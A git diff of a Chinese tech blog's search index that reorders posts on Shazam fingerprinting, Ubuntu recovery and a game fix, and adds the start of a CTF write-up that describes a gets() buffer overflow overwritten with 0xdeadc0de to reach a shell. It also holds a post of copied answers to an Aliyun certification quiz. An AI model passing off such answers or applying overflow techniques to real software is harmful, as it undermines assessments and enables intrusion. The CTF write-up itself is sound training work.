@@ -531,88 +531,6 @@ def generateFilehash(filepath, blocksize=2 ** 16):
       </tags>
   </entry>
   <entry>
-    <title>shazam听歌识曲算法解析+python实现-2 生成指纹</title>
-    <url>/2019/02/09/blogarchive/2019-02-09-17-01-47/</url>
-    <content><![CDATA[<p>第二部份<br>在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》，最好是一个字一个字，一个图一个图的把paper看下来（然后你就不需要来看这篇文章了，笑）</p>
-<p>paper下载链接：<a href="https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf">https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf</a><br>中文翻译：<a href="https://blog.csdn.net/yutianzuijin/article/details/49787551">https://blog.csdn.net/yutianzuijin/article/details/49787551</a><br>建议读英文的鸭。</p>
-<p>好的，那么正式开始。</p>
-<p>基本原理：对于每个音频，我们都要给他生成一些特殊的指纹，然后用这些指纹和要识别的歌曲进行比较，最后取匹配率最高的那个，就是识别出来的歌曲啦~</p>
-<p>听起来是不是非常简单鸭~~~~</p>
-<p>那么怎么生成这个指纹呢，好问题！我们要分为三个步骤：</p>
-<p>1、生成频谱图（频域图像）。</p>
-<p>2、在频谱图的基础上计算出Constellation Map（星状图）</p>
-<p>3、对星状图进行处理，生成指纹哈希。</p>
-<p>首先是生成频谱图。</p>
-<p>为了生成频谱图，我们就得把歌曲最开始拿出来的数据进行一波傅里叶变换，把时域信号转变为频域信号。</p>
-<p>什么？你不知道傅里叶变换（Fourier Transformation）？不如看看这个<br><a href="https://zhuanlan.zhihu.com/p/19759362">https://zhuanlan.zhihu.com/p/19759362</a></p>
-<p>但是，傅里叶变换有一个缺陷，那就是他在变换过程中把时间信息丢失了，也就是说傅里叶变换“不能反映时间维度局部区域上的特征, 人们虽然从傅立叶变换能清楚地看到一整段信号包含的每一个频率的分量值，但很难看出对应于频率域成分的不同时间信号的持续时间和发射的持续时间，缺少时间信息使得傅立叶分析再更精密的分析中失去作用[1]。“</p>
-<p>在听歌识曲中，时间是一个非常重要的因素。如果我们没有了时间，我就不知道什么频率在什么时候出现，强度又是多少。</p>
-<p>所以，我们不能抛弃时间这个变量。因此，我们可以利用短时傅里叶变换（STFT，short time Fourier transformation）来对音频数据进行分析和计算。<br>短时傅里叶变换通过加窗操作，把信号分成一段一段来计算，这样子在将时域型号转变为频域信号的同时，保留住时间了。</p>
-<p>这看起来非常困难，但是！python中大量的第三方库给予了我们极大的便利。</p>
-<p>这里我们用到了<code>matplotlib</code> 中的<code> mlab.specgram</code> 来对音频数据进行分析。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e97620b352.jpg" alt="生成频谱图"></p>
-<p>如图所示，只要我们把上一步中取到的音频数据（sample 每一个channel中的数据），放到里面，然后加上一些参数就好啦。</p>
-<p>对于这些参数，我们可以取默认值，也可以自己修改。有兴趣可以去官方文档里看。</p>
-<p>我的取值是 nfft = 4096, nooverlap = 2048, window(加窗函数)用的是Hamming窗函数，fs是音频的采样速率。</p>
-<p>接着，我们还可以对数据进行一些操作，比如：对取出来的值进行log运算，将其放到对数空间中，便于数据之间的比较与操作（因为不放入对数空间的话，数值可能会很大）。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e97620f54a.jpg" alt="放入对数空间中"></p>
-<p>像这样，通过log10 之后的强度大小（或者说能量大小）范围便会控制在0-70这个范围之内啦。</p>
-<p>频谱图的样子：</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e97ac25331.jpg" alt="au中的"></p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e97620f04b.jpg" alt="论文中的"></p>
-<p>好的，生成了频谱图，接下来我们要做的就是第二步，生成Constellation Map！</p>
-<p>首先我们来看看星状图到底长什么样（如果你读过paper,或许可能已经知道了）</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e97620c085.jpg" alt="论文中下星状图"></p>
-<p>根据paper中所说的，能量越大的点抗噪性就越强，所以我们将能量大的点作为判断依据。</p>
-<p>在频谱图中，颜色越亮代表该点的能量越大。仔细观察一下，每个点（也就是星星）的位置是不是都在都在颜色比较亮的地方。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e97ac1a4e0.png" alt="myplot生成的"></p>
-<p> 小小的解释一下，这个频谱图看起来是二维的，实际上是三维的，包含时间，频率，以及能量大小（强度）</p>
-<p>那么，我们要如何找到这些能量较大的点呢？（由于up能力有限，只能复制粘贴别人的方法了）。</p>
-<p>我们可以scipy利用图像分析法来找到这些点。</p>
-<p>好的，我们请看worldveil大神在项目dejavu [2]中带来的算法（鼓掌！！！！！！！！）。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e9762206fe.jpg" alt="获得极值"></p>
-<p>minimun_peak_amplitude 是可以认为是能量较大点的最小能量值（在log空间中它 的取值范围是0-70），取得越高，产生的能量较大点的数量就越少，准确率就越低，但也不要取的太小。我在这里取了minimun_peak_amplitude=10<br>peak_neighborhood_size 是一个点想要成为能量较大点，也就是local maximum 所处的领域的大小。越小的话产生的点会越多，不建议太大，也不建议太小。我在这里取了peak_neighborhood_size = 20</p>
-<p>其中frequency_idx 和time_idx 就是能量较大的点所处的频率坐标和时间坐标了。</p>
-<p>我们可以用zip函数把他们组成坐标的形式[(t1,f1),(t2,f2),(t3,f3)……]</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e9761c092c.jpg" alt="zip函数"></p>
-<p>其实到这里，我们已经可以通过这个星状图来对歌曲进行识别了，只要看某个片段是否能够与整首歌中某一块区域的对上就可以判断了。</p>
-<p>论文的作者是这样子描述的：If you put the constellation map of a database song on a strip chart, and the constellation map of a short matching audio sample of a few seconds length on a transparent piece of plastic, then slide the latter over the former, at some point a significant number of points will coincide when the proper time offset is located and the two constellation maps are aligned in register. [4] 数据库中某首歌的星状图散乱在一个条形图上，然后将几秒样本的星状图放在一个透明的塑料板上。在条形图上滑行塑料板（有点像游标卡尺），到某个时刻的时候就会出现一件神奇的事情：当样本和数据库歌曲的正确位置对齐时，重叠的极大值就会格外多，这样就意味着样本和数据库中正确音乐的正确位置匹配上了！[3]</p>
-<p>但是，这样子做需要耗费大量的时间，如何才能加快呢。我们可以对这些坐标进行快速组合哈希来获取最终的指纹。</p>
-<p>所以第三步！对星状图进行处理，生成指纹哈希。</p>
-<p>在生成指纹哈希的基本原理：将两个能量最高的点组合在一起，生成一个指纹，包含由两者的频率和时间差组成的哈希，以及锚点的时间位置。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e97620b9f9.jpg" alt="基本原理"></p>
-<p>为此，我们首先要选择一个锚点（anchor point），然后每个锚点都对应一个目标区域（target zone）。（ps: 这个target zone 的选择极为讲究，我踩了一堆坑。）</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e97620db47.jpg" alt="锚点和目标区域"></p>
-<p>target zone与anchor point的距离不宜靠的太近，也不宜离得太远，</p>
-<p>前者会导致选择的两个点没有独特性，从而使生成 的哈希没有什么卵用；</p>
-<p>后者会导致两个点的时间跨度太大,也会使生成哈希没什么鸡儿用。所以，这个时候我们要认真看一下论文中的图。</p>
-<p>上图可以发现，anchor point 和 target zone 之间至少隔了5个时间单位，小于5个时间单位的都没选。</p>
-<p>所以，我们在选择target zone的时候，时间差最好要超过5个单位。如果你们不信的话可以自己试一试，up被这个坑了好久。</p>
-<p>接下来上代码</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e9761e5f41.jpg" alt="捕获排序"></p>
-<p>首先，我们要对上一步中取得的那些能量较大点以时间顺序进行排序。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e97abef92f.jpg" alt="操作一波"></p>
-<p>然后，我们将每一个能量较大点后的n个点作为target zone的范围。这个n称为fan-out。Fan-out用来决定每一个anchor point 最多可以与多少个点进行匹配。</p>
-<p>同时，我们通过判断两个点之间的时间差是否在我们需要的范围内，来最终决定是否将这两个点作为歌曲的指纹放入数据库中。</p>
-<p>time_constraint_condition 是一个 元组，包含可以作为指纹的两个点的最小时间差和最大时间差，up的取值是 (9,200)<br>fanout_factor 越大，生成的指纹就越多，在提高成功率的同时增大了所需要的储存空间以及牺牲了一点点的查询速度。up 的取值是 fanout_facotr = 20 (论文中说大于10就可以了)</p>
-<p>然后，我们只需要把两个点的频率以及时间差组合起来，生成一个哈希，在加上anchor point的时间位置，一个指纹就生成好了。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5e97abe7bae.jpg" alt="生成指纹"></p>
-<p>嘛，生成指纹的部分就完成啦。接下来就只有搜索与识别的部分了。</p>
-<p>结束。</p>
-<p>转载请先获得许可。</p>
-<p>[1]: <a href="https://blog.csdn.net/lvsehaiyang1993/article/details/80521538">https://blog.csdn.net/lvsehaiyang1993/article/details/80521538</a></p>
-<p>[2]: <a href="https://github.com/worldveil/dejavu">https://github.com/worldveil/dejavu</a></p>
-<p>[3]: <a href="https://blog.csdn.net/yutianzuijin/article/details/49787551">https://blog.csdn.net/yutianzuijin/article/details/49787551</a></p>
-<p>[4]: Wang, Avery. &quot;An Industrial Strength Audio Search Algorithm.&quot; Ismir. Vol. 2003. 2003.</p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>shazam</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Shazam听歌识曲算法解析+python实现-3 检索歌曲</title>
     <url>/2019/02/09/blogarchive/2019-02-09-20-39-15/</url>
     <content><![CDATA[<p>第三部份<br>在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》。 </p>
@@ -692,6 +610,88 @@ def generateFilehash(filepath, blocksize=2 ** 16):
       </categories>
       <tags>
         <tag>raspberryPi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shazam听歌识曲算法解析+python实现-2 生成指纹</title>
+    <url>/2019/02/09/blogarchive/2019-02-09-17-01-47/</url>
+    <content><![CDATA[<p>第二部份<br>在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》，最好是一个字一个字，一个图一个图的把paper看下来（然后你就不需要来看这篇文章了，笑）</p>
+<p>paper下载链接：<a href="https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf">https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf</a><br>中文翻译：<a href="https://blog.csdn.net/yutianzuijin/article/details/49787551">https://blog.csdn.net/yutianzuijin/article/details/49787551</a><br>建议读英文的鸭。</p>
+<p>好的，那么正式开始。</p>
+<p>基本原理：对于每个音频，我们都要给他生成一些特殊的指纹，然后用这些指纹和要识别的歌曲进行比较，最后取匹配率最高的那个，就是识别出来的歌曲啦~</p>
+<p>听起来是不是非常简单鸭~~~~</p>
+<p>那么怎么生成这个指纹呢，好问题！我们要分为三个步骤：</p>
+<p>1、生成频谱图（频域图像）。</p>
+<p>2、在频谱图的基础上计算出Constellation Map（星状图）</p>
+<p>3、对星状图进行处理，生成指纹哈希。</p>
+<p>首先是生成频谱图。</p>
+<p>为了生成频谱图，我们就得把歌曲最开始拿出来的数据进行一波傅里叶变换，把时域信号转变为频域信号。</p>
+<p>什么？你不知道傅里叶变换（Fourier Transformation）？不如看看这个<br><a href="https://zhuanlan.zhihu.com/p/19759362">https://zhuanlan.zhihu.com/p/19759362</a></p>
+<p>但是，傅里叶变换有一个缺陷，那就是他在变换过程中把时间信息丢失了，也就是说傅里叶变换“不能反映时间维度局部区域上的特征, 人们虽然从傅立叶变换能清楚地看到一整段信号包含的每一个频率的分量值，但很难看出对应于频率域成分的不同时间信号的持续时间和发射的持续时间，缺少时间信息使得傅立叶分析再更精密的分析中失去作用[1]。“</p>
+<p>在听歌识曲中，时间是一个非常重要的因素。如果我们没有了时间，我就不知道什么频率在什么时候出现，强度又是多少。</p>
+<p>所以，我们不能抛弃时间这个变量。因此，我们可以利用短时傅里叶变换（STFT，short time Fourier transformation）来对音频数据进行分析和计算。<br>短时傅里叶变换通过加窗操作，把信号分成一段一段来计算，这样子在将时域型号转变为频域信号的同时，保留住时间了。</p>
+<p>这看起来非常困难，但是！python中大量的第三方库给予了我们极大的便利。</p>
+<p>这里我们用到了<code>matplotlib</code> 中的<code> mlab.specgram</code> 来对音频数据进行分析。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e97620b352.jpg" alt="生成频谱图"></p>
+<p>如图所示，只要我们把上一步中取到的音频数据（sample 每一个channel中的数据），放到里面，然后加上一些参数就好啦。</p>
+<p>对于这些参数，我们可以取默认值，也可以自己修改。有兴趣可以去官方文档里看。</p>
+<p>我的取值是 nfft = 4096, nooverlap = 2048, window(加窗函数)用的是Hamming窗函数，fs是音频的采样速率。</p>
+<p>接着，我们还可以对数据进行一些操作，比如：对取出来的值进行log运算，将其放到对数空间中，便于数据之间的比较与操作（因为不放入对数空间的话，数值可能会很大）。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e97620f54a.jpg" alt="放入对数空间中"></p>
+<p>像这样，通过log10 之后的强度大小（或者说能量大小）范围便会控制在0-70这个范围之内啦。</p>
+<p>频谱图的样子：</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e97ac25331.jpg" alt="au中的"></p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e97620f04b.jpg" alt="论文中的"></p>
+<p>好的，生成了频谱图，接下来我们要做的就是第二步，生成Constellation Map！</p>
+<p>首先我们来看看星状图到底长什么样（如果你读过paper,或许可能已经知道了）</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e97620c085.jpg" alt="论文中下星状图"></p>
+<p>根据paper中所说的，能量越大的点抗噪性就越强，所以我们将能量大的点作为判断依据。</p>
+<p>在频谱图中，颜色越亮代表该点的能量越大。仔细观察一下，每个点（也就是星星）的位置是不是都在都在颜色比较亮的地方。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e97ac1a4e0.png" alt="myplot生成的"></p>
+<p> 小小的解释一下，这个频谱图看起来是二维的，实际上是三维的，包含时间，频率，以及能量大小（强度）</p>
+<p>那么，我们要如何找到这些能量较大的点呢？（由于up能力有限，只能复制粘贴别人的方法了）。</p>
+<p>我们可以scipy利用图像分析法来找到这些点。</p>
+<p>好的，我们请看worldveil大神在项目dejavu [2]中带来的算法（鼓掌！！！！！！！！）。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e9762206fe.jpg" alt="获得极值"></p>
+<p>minimun_peak_amplitude 是可以认为是能量较大点的最小能量值（在log空间中它 的取值范围是0-70），取得越高，产生的能量较大点的数量就越少，准确率就越低，但也不要取的太小。我在这里取了minimun_peak_amplitude=10<br>peak_neighborhood_size 是一个点想要成为能量较大点，也就是local maximum 所处的领域的大小。越小的话产生的点会越多，不建议太大，也不建议太小。我在这里取了peak_neighborhood_size = 20</p>
+<p>其中frequency_idx 和time_idx 就是能量较大的点所处的频率坐标和时间坐标了。</p>
+<p>我们可以用zip函数把他们组成坐标的形式[(t1,f1),(t2,f2),(t3,f3)……]</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e9761c092c.jpg" alt="zip函数"></p>
+<p>其实到这里，我们已经可以通过这个星状图来对歌曲进行识别了，只要看某个片段是否能够与整首歌中某一块区域的对上就可以判断了。</p>
+<p>论文的作者是这样子描述的：If you put the constellation map of a database song on a strip chart, and the constellation map of a short matching audio sample of a few seconds length on a transparent piece of plastic, then slide the latter over the former, at some point a significant number of points will coincide when the proper time offset is located and the two constellation maps are aligned in register. [4] 数据库中某首歌的星状图散乱在一个条形图上，然后将几秒样本的星状图放在一个透明的塑料板上。在条形图上滑行塑料板（有点像游标卡尺），到某个时刻的时候就会出现一件神奇的事情：当样本和数据库歌曲的正确位置对齐时，重叠的极大值就会格外多，这样就意味着样本和数据库中正确音乐的正确位置匹配上了！[3]</p>
+<p>但是，这样子做需要耗费大量的时间，如何才能加快呢。我们可以对这些坐标进行快速组合哈希来获取最终的指纹。</p>
+<p>所以第三步！对星状图进行处理，生成指纹哈希。</p>
+<p>在生成指纹哈希的基本原理：将两个能量最高的点组合在一起，生成一个指纹，包含由两者的频率和时间差组成的哈希，以及锚点的时间位置。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e97620b9f9.jpg" alt="基本原理"></p>
+<p>为此，我们首先要选择一个锚点（anchor point），然后每个锚点都对应一个目标区域（target zone）。（ps: 这个target zone 的选择极为讲究，我踩了一堆坑。）</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e97620db47.jpg" alt="锚点和目标区域"></p>
+<p>target zone与anchor point的距离不宜靠的太近，也不宜离得太远，</p>
+<p>前者会导致选择的两个点没有独特性，从而使生成 的哈希没有什么卵用；</p>
+<p>后者会导致两个点的时间跨度太大,也会使生成哈希没什么鸡儿用。所以，这个时候我们要认真看一下论文中的图。</p>
+<p>上图可以发现，anchor point 和 target zone 之间至少隔了5个时间单位，小于5个时间单位的都没选。</p>
+<p>所以，我们在选择target zone的时候，时间差最好要超过5个单位。如果你们不信的话可以自己试一试，up被这个坑了好久。</p>
+<p>接下来上代码</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e9761e5f41.jpg" alt="捕获排序"></p>
+<p>首先，我们要对上一步中取得的那些能量较大点以时间顺序进行排序。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e97abef92f.jpg" alt="操作一波"></p>
+<p>然后，我们将每一个能量较大点后的n个点作为target zone的范围。这个n称为fan-out。Fan-out用来决定每一个anchor point 最多可以与多少个点进行匹配。</p>
+<p>同时，我们通过判断两个点之间的时间差是否在我们需要的范围内，来最终决定是否将这两个点作为歌曲的指纹放入数据库中。</p>
+<p>time_constraint_condition 是一个 元组，包含可以作为指纹的两个点的最小时间差和最大时间差，up的取值是 (9,200)<br>fanout_factor 越大，生成的指纹就越多，在提高成功率的同时增大了所需要的储存空间以及牺牲了一点点的查询速度。up 的取值是 fanout_facotr = 20 (论文中说大于10就可以了)</p>
+<p>然后，我们只需要把两个点的频率以及时间差组合起来，生成一个哈希，在加上anchor point的时间位置，一个指纹就生成好了。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5e97abe7bae.jpg" alt="生成指纹"></p>
+<p>嘛，生成指纹的部分就完成啦。接下来就只有搜索与识别的部分了。</p>
+<p>结束。</p>
+<p>转载请先获得许可。</p>
+<p>[1]: <a href="https://blog.csdn.net/lvsehaiyang1993/article/details/80521538">https://blog.csdn.net/lvsehaiyang1993/article/details/80521538</a></p>
+<p>[2]: <a href="https://github.com/worldveil/dejavu">https://github.com/worldveil/dejavu</a></p>
+<p>[3]: <a href="https://blog.csdn.net/yutianzuijin/article/details/49787551">https://blog.csdn.net/yutianzuijin/article/details/49787551</a></p>
+<p>[4]: Wang, Avery. &quot;An Industrial Strength Audio Search Algorithm.&quot; Ismir. Vol. 2003. 2003.</p>
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>shazam</tag>
       </tags>
   </entry>
   <entry>
@@ -1034,32 +1034,6 @@ alter table fingerprints drop partition p20
       </tags>
   </entry>
   <entry>
-    <title>阿里云白嫖</title>
-    <url>/2019/09/03/blogarchive/2019-09-03-20-18-17/</url>
-    <content><![CDATA[<p>从群里看见的</p>
-<p>大概能拿200代金券</p>
-<p>地址: <a href="https://developer.aliyun.com/certification?inviteCode=pifgful6xp346">https://developer.aliyun.com/certification?inviteCode=pifgful6xp346</a></p>
-<p>选java高级测试</p>
-<p>答案:</p>
-<p>下面关于数组排序的说明哪项是错误的？<br>Comparator接口中提供有compare（）方法实现数组的排序操作</p>
-<p>使用Runtime类的gc（）方法，可以释放垃圾内存</p>
-<p>object类中的getclass（）方法不能被覆写</p>
-<p>synchronized关键字常用来为对象加锁，从而使得对对象的访问是排他的</p>
-<p>serializable接口无法实现多线程子类定义</p>
-<p>如果要实现多线程编程下面哪项描述是错误的？<br>多线程处理类可以继承Synchronized类，同时覆写run（）方法如果要为对象回收做收尾操作，应该覆写objectt类中的finalize（）方法</p>
-<p>当执行“Math.round（-15.61）&quot;程序后的计算结果是哪个？<br>-16</p>
-<p>public string tostring（）<br>不是object类所提供的线程操作方法</p>
-<p>下列关于Date描述错误的一项<br>直接输出Date类对象就可以取得日期时间数据，但是取得的月数是从0开始计算的</p>
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
-        <tag>aliyun</tag>
-        <tag>白嫖</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>记一次阿里云学生服务器白嫖</title>
     <url>/2019/09/03/blogarchive/2019-09-03-20-51-24/</url>
     <content><![CDATA[<h3 id="购买服务器-白嫖"><a href="#购买服务器-白嫖" class="headerlink" title="购买服务器 (白嫖)"></a>购买服务器 (白嫖)</h3><hr>
@@ -1089,8 +1063,34 @@ alter table fingerprints drop partition p20
         <category>Life</category>
       </categories>
       <tags>
-        <tag>aliyun</tag>
         <tag>白嫖</tag>
+        <tag>aliyun</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>阿里云白嫖</title>
+    <url>/2019/09/03/blogarchive/2019-09-03-20-18-17/</url>
+    <content><![CDATA[<p>从群里看见的</p>
+<p>大概能拿200代金券</p>
+<p>地址: <a href="https://developer.aliyun.com/certification?inviteCode=pifgful6xp346">https://developer.aliyun.com/certification?inviteCode=pifgful6xp346</a></p>
+<p>选java高级测试</p>
+<p>答案:</p>
+<p>下面关于数组排序的说明哪项是错误的？<br>Comparator接口中提供有compare（）方法实现数组的排序操作</p>
+<p>使用Runtime类的gc（）方法，可以释放垃圾内存</p>
+<p>object类中的getclass（）方法不能被覆写</p>
+<p>synchronized关键字常用来为对象加锁，从而使得对对象的访问是排他的</p>
+<p>serializable接口无法实现多线程子类定义</p>
+<p>如果要实现多线程编程下面哪项描述是错误的？<br>多线程处理类可以继承Synchronized类，同时覆写run（）方法如果要为对象回收做收尾操作，应该覆写objectt类中的finalize（）方法</p>
+<p>当执行“Math.round（-15.61）&quot;程序后的计算结果是哪个？<br>-16</p>
+<p>public string tostring（）<br>不是object类所提供的线程操作方法</p>
+<p>下列关于Date描述错误的一项<br>直接输出Date类对象就可以取得日期时间数据，但是取得的月数是从0开始计算的</p>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>白嫖</tag>
+        <tag>aliyun</tag>
       </tags>
   </entry>
   <entry>
@@ -1501,28 +1501,6 @@ server {
       </tags>
   </entry>
   <entry>
-    <title>Paradox Interactive games can&#39;t run on windows + Solution</title>
-    <url>/2019/10/29/blogarchive/2019-10-29-17-03-47/</url>
-    <content><![CDATA[<h3 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h3><p>Some people may find that paradox games such as Heart of Iron will crash on windows 10.</p>
-<p>According to the steam page, paradox games often require directX 9.0c as the running time. </p>
-<p>However, since windows 10 doesn&#39;t support directX anymore. And windows 10 pre-install with directX 11. The games can&#39;t run properly.</p>
-<hr>
-<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><ol>
-<li><p>go to <a href="https://blog.csdn.net/VBcom/article/details/9140197">https://blog.csdn.net/VBcom/article/details/9140197</a> and download the <strong>DirectX repair</strong></p>
-</li>
-<li><p>run the application and restart your computer.</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>系统默认</category>
-      </categories>
-      <tags>
-        <tag>solution</tag>
-        <tag>game</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>简析b站关于站内链接的正则匹配</title>
     <url>/2020/08/04/blogarchive/2020-08-04-16-05-57/</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文由 <a href="https://blog.boxpaper.club/">@Rorical</a> 的文章<a href="https://blog.boxpaper.club/archives/72/">《优雅的在哔哩哔哩评论区发送链接》</a>启发，目的在于学习正则匹配的基本技巧。</p>
@@ -1723,6 +1701,28 @@ https://www.bsfdvbsbilibili.com
       <tags>
         <tag>bilibili</tag>
         <tag>re</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Paradox Interactive games can&#39;t run on windows + Solution</title>
+    <url>/2019/10/29/blogarchive/2019-10-29-17-03-47/</url>
+    <content><![CDATA[<h3 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h3><p>Some people may find that paradox games such as Heart of Iron will crash on windows 10.</p>
+<p>According to the steam page, paradox games often require directX 9.0c as the running time. </p>
+<p>However, since windows 10 doesn&#39;t support directX anymore. And windows 10 pre-install with directX 11. The games can&#39;t run properly.</p>
+<hr>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><ol>
+<li><p>go to <a href="https://blog.csdn.net/VBcom/article/details/9140197">https://blog.csdn.net/VBcom/article/details/9140197</a> and download the <strong>DirectX repair</strong></p>
+</li>
+<li><p>run the application and restart your computer.</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>系统默认</category>
+      </categories>
+      <tags>
+        <tag>solution</tag>
+        <tag>game</tag>
       </tags>
   </entry>
   <entry>
@@ -2419,6 +2419,45 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
+    <title>关于apt update到一半关机导致ubuntu系统崩溃这回事</title>
+    <url>/2022/07/11/life/20220711-ri-ji/</url>
+    <content><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>总之，今天在我的beelink小主机上捣鼓一些东西。</p>
+<p>想安装一个软件包，看到有好多可以可以更新的，然后心想着要不全部更新一哈，然后我就<code>apt upgrade</code>了。</p>
+<p>这本来也没什么，但是我<strong>不小心</strong>按倒了电源键，导致这整个系统关机了。这一关机，就出了大问题。</p>
+<p>先是打不开桌面，一只卡在Ubuntu然后带4个点的界面上。</p>
+<p>然后我又重启了一下，摁<code>alt+f1</code>看看日志，不看不知道，一看吓一跳，所有的service基本都报错了。而且这个报错还不是一般的报错。</p>
+<p>先用<code>alt+f2</code>进入命令行界面，然后用<code>systemctl</code>查看报错内容，好家伙，全是<code>core-dump</code>或者<code>segment fault</code>。直接给我整麻了。</p>
+<h2 id="尝试解决"><a href="#尝试解决" class="headerlink" title="尝试解决"></a>尝试解决</h2><span id="more"></span>
+<p>然后我依次尝试了以下的解决方式</p>
+<ol>
+<li>尝试使用apt重新安装 -&gt; 但问题是，因为NetworkManager这个service也无法启动，用命令行连接wifi也报错segment fault。所以连不上网，apt等于没用<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo rm /var/lib/apt/lists/lock</span><br><span class="line">sudo rm /var/lib/dpkg/lock</span><br><span class="line">sudo rm /var/lib/dpkg/lock-front-end</span><br><span class="line">sudo rm /var/cache/apt/archives/lock</span><br><span class="line">sudo dpkg --configure -a</span><br><span class="line">sudo apt clean</span><br><span class="line">sudo apt update --fix-missing</span><br><span class="line">sudo apt install -f</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>credit to <a href="https://linuxhint.com/fix-broken-ubuntu-without-reinstalling/">https://linuxhint.com/fix-broken-ubuntu-without-reinstalling/</a></p>
+</blockquote>
+</li>
+<li>尝试用系统u盘启动，寻找可能的repair选项 -&gt; 很可惜，没有，只有删除重装</li>
+<li>尝试进入recover模式 -&gt; 失败，甚至dpkg也报segment fault错误</li>
+</ol>
+<h2 id="最后的方法"><a href="#最后的方法" class="headerlink" title="最后的方法"></a>最后的方法</h2><p><strong>重装系统</strong></p>
+<p>然后想了想，既然我可以进入系统，而且我大部分的应用都是docker运行的。我只需要把配置文件复制出来，然后再重装系统不就完事了。</p>
+<p>于是我就进系统. <code>fdisk -l</code> 找到u盘 <code>sudo mount /dev/sdc1 /mnt/usb</code> 挂载。把文件都备份好之后，再插上系统安装盘，重装系统.jpg</p>
+<p>然后就好了</p>
+<h2 id="一些想法"><a href="#一些想法" class="headerlink" title="一些想法"></a>一些想法</h2><ol>
+<li>更新的时候别断电</li>
+<li>做好备份</li>
+<li>docker真tm的好用，要是我不是docker而是自己编译部署的话，那我麻了。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>ubuntu</tag>
+        <tag>碎碎念</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MapleBacon First 1st Place in CTF</title>
     <url>/2022/04/20/life/maple-bacon-first-first-place-in-ctf/</url>
     <content><![CDATA[<p>It&#39;s the first first !!!!!!!!!</p>
@@ -2634,6 +2673,36 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
+    <title>[writeup][DownUnderCTF 2021] pwn-deadcode</title>
+    <url>/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/</url>
+    <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>no pie enable. so we can simply overwrite.</p>
+<p>note that there are <code>gets</code> without length, which can perform <strong>buffoverflow</strong></p>
+<p><img src="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/20211009120913.png" alt="stack"></p>
+<p>since s is above var_8h, we can write random 16 bytes + 0xdeadc0de in 8 bytes to overwrite var_8h to value of 0xdeadc0de, which will lead us to the shell.</p>
+<span id="more"></span>
+
